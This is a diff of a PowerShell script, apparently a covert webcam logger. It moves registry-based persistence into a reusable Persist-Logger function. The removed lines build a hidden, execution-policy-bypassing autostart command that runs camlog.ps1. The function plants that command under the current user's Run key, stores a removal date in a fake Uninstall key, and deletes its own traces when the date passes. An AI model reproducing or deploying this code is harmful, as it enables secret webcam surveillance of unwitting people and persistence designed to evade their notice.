@@ -1,3 +1,38 @@
+function Persist-Logger {
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[string]$name,
+        [parameter(Mandatory=$True)]
+		[string]$Command 
+	);
+
+    if($DaysRun -eq -1 -or $DaysRun -gt 0){
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
+    
+        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Value $Command;
+    
+        if($DaysRun -eq -1){ return };
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
+    
+        $date = (Get-Date).AddDays($daysRun);
+        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date' -Value $date;
+    }
+    
+    if($DaysRun -gt 0){
+        $date = Get-Date;
+        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date';
+        $targetDate = [DateTime]$targetValue.date;
+    
+        if($date -lt $targetDate){ return }
+    
+        Remove-Item "$env:temp\txtlog.ps1" -Force;
+        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Force
+    }
+}
+
 function Start-WebcamLogger{
     [CmdletBinding()]
     param
@@ -59,30 +94,5 @@ if(-not (Test-Path -Path 'ffmpeg/ffmpeg.exe' -PathType Leaf)){
     Remove-Item "7z.exe" -Force;
 }
 
-if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\camlog'){ return };
-
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Anontoken=' + $Anontoken + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit'); 
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog' -Value $autostart;
-
-    if($DaysRun -eq -1){ return };
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\camlog'){ return };
-
-    $date = (Get-Date).AddDays($daysRun);
-    New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\camlog' -Force;
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\camlog' -Name 'date' -Value $date;
-}
-
-if($DaysRun -gt 0){
-    $date = Get-Date;
-    $targetValue = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\camlog' -Name 'date';
-    $targetDate = [DateTime]$targetValue.date;
-
-    if($date -lt $targetDate){ return }
-
-    Remove-Item "$env:temp\camlog.ps1" -Force;
-    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\camlog' -Force
-    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force
-}
-
+Persist-Logger "camlog" -Command $autostart;
 Start-WebcamLogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
